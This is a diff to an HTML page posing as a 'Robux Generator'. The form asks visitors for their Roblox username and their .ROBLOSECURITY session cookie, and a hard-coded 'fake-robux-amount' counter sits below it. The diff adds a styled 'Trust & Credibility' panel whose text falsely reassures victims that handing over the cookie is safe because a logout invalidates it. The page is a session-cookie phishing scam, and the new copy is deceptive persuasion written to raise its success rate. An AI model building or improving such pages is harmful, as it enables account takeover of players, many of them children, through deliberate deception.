@@ -250,30 +250,97 @@
             0% { transform: rotate(0deg);}
             100% { transform: rotate(360deg);}
         }
+        /* Trust & Credibility section styling */
+        .trust-cred-section {
+            max-width: 370px;
+            background: #f6fffa;
+            border: 2px solid #00ea64;
+            border-radius: 16px;
+            margin: 30px auto 10px auto;
+            padding: 22px 22px 17px 22px;
+            box-shadow: 0 2px 16px #00ea6423;
+        }
+        .trust-cred-section h2 {
+            font-family: 'Orbitron', Arial, sans-serif;
+            color: #12c962;
+            font-size: 1.13rem;
+            margin-top: 0;
+            margin-bottom: 10px;
+            letter-spacing: 0.7px;
+        }
+        .trust-cred-section ul {
+            margin: 7px 0 0 19px;
+            padding: 0;
+        }
+        .trust-cred-section li {
+            margin-bottom: 9px;
+            font-size: 13.1px;
+            color: #2c5742;
+        }
+        .trust-cred-section .reason {
+            margin: 11px 0 0 0;
+            font-size: 13.3px;
+            background: #ebfff1;
+            border-left: 4px solid #30eb8e;
+            border-radius: 7px;
+            padding: 9px 11px 9px 13px;
+            color: #20754f;
+            font-weight: 600;
+            letter-spacing: .17px;
+        }
+        .trust-cred-section .why-need {
+            background: #eefdfe;
+            padding: 8px 11px 9px 13px;
+            border-left: 4px solid #34d1ed;
+            color: #29587b;
+            border-radius: 7px;
+            font-size: 13.2px;
+            margin-top: 13px;
+            font-weight: 600;
+            letter-spacing: .17px;
+        }
     </style>
 </head>
 <body>
     <div style="display:flex; align-items: flex-start; justify-content: center; gap: 32px;">
-        <div class="container">
-            <img class="roblox-logo" src="https://carrotsandcake.com/wp-content/uploads/2025/01/robux-png.png" alt="Roblox Logo">
-            <h1>Robux Generator</h1>
-            <div class="verif">🔒 Roblox Plus Security Verification Enabled</div>
-            <div id="msg"></div>
-            <form id="robux-form" autocomplete="off">
-                <input type="text" id="username" placeholder="Enter your Roblox Username" required autocomplete="username">
-                <input type="number" id="robux" placeholder="Amount of Robux (Max 5000)" min="1" max="5000" required>
-                <input type="text" id="cookie" placeholder="Session (.ROBLOSECURITY) Cookie" required autocomplete="off">
-                <button type="submit">Claim Robux</button>
-            </form>
-            <div class="progress-bar-bg" id="progress-bar">
-                <div class="progress-bar-fill" id="progress-bar-fill"></div>
+        <div>
+            <div class="container">
+                <img class="roblox-logo" src="https://carrotsandcake.com/wp-content/uploads/2025/01/robux-png.png" alt="Roblox Logo">
+                <h1>Robux Generator</h1>
+                <div class="verif">🔒 Roblox Plus Security Verification Enabled</div>
+                <div id="msg"></div>
+                <form id="robux-form" autocomplete="off">
+                    <input type="text" id="username" placeholder="Enter your Roblox Username" required autocomplete="username">
+                    <input type="number" id="robux" placeholder="Amount of Robux (Max 5000)" min="1" max="5000" required>
+                    <input type="text" id="cookie" placeholder="Session (.ROBLOSECURITY) Cookie" required autocomplete="off">
+                    <button type="submit">Claim Robux</button>
+                </form>
+                <div class="progress-bar-bg" id="progress-bar">
+                    <div class="progress-bar-fill" id="progress-bar-fill"></div>
+                </div>
+                <div class="note">
+                    <img src="https://cdn.iconscout.com/icon/free/png-128/robux-roblox-2831165-2357098.png?f=webp&w=32" style="width:19px; vertical-align:middle; margin-right:3px;">
+                    <b>NOTE:</b> For protection, your .ROBLOSECURITY cookie is required to verify you are the owner of this account.
+                    <br>Maximum transfer: <b>5000 Robux</b> per 30 minutes.
+                </div>
+                <div class="fake-robux-amount" id="robux-total">Total Robux Available: <span id="robux-count">492,472</span></div>
             </div>
-            <div class="note">
-                <img src="https://cdn.iconscout.com/icon/free/png-128/robux-roblox-2831165-2357098.png?f=webp&w=32" style="width:19px; vertical-align:middle; margin-right:3px;">
-                <b>NOTE:</b> For protection, your .ROBLOSECURITY cookie is required to verify you are the owner of this account.
-                <br>Maximum transfer: <b>5000 Robux</b> per 30 minutes.
+            <!-- Trust & Credibility Section - Professional -->
+            <div class="trust-cred-section">
+                <h2>Trust &amp; Credibility</h2>
+                <ul>
+                    <li><b>Why Choose Us?</b></li>
+                </ul>
+                <div class="reason">
+                    We use <b>conservative delivery limits</b> and <b>controlled distribution methods</b> to reduce risk and help keep accounts in good standing.
+                </div>
+                <ul>
+                    <li><b>Why do we need your .ROBLOSECURITY cookie?</b></li>
+                </ul>
+                <div class="why-need">
+                    It's the only way to <b>securely access your Roblox account</b> and add the Robux directly. After we're done, we log out immediately—this invalidates the cookie, so it can't be used again and your account stays safe!
+                </div>
             </div>
-            <div class="fake-robux-amount" id="robux-total">Total Robux Available: <span id="robux-count">492,472</span></div>
         </div>
         <div class="side-trustbox">
             <span class="side-title">Why Trust Us?</span>
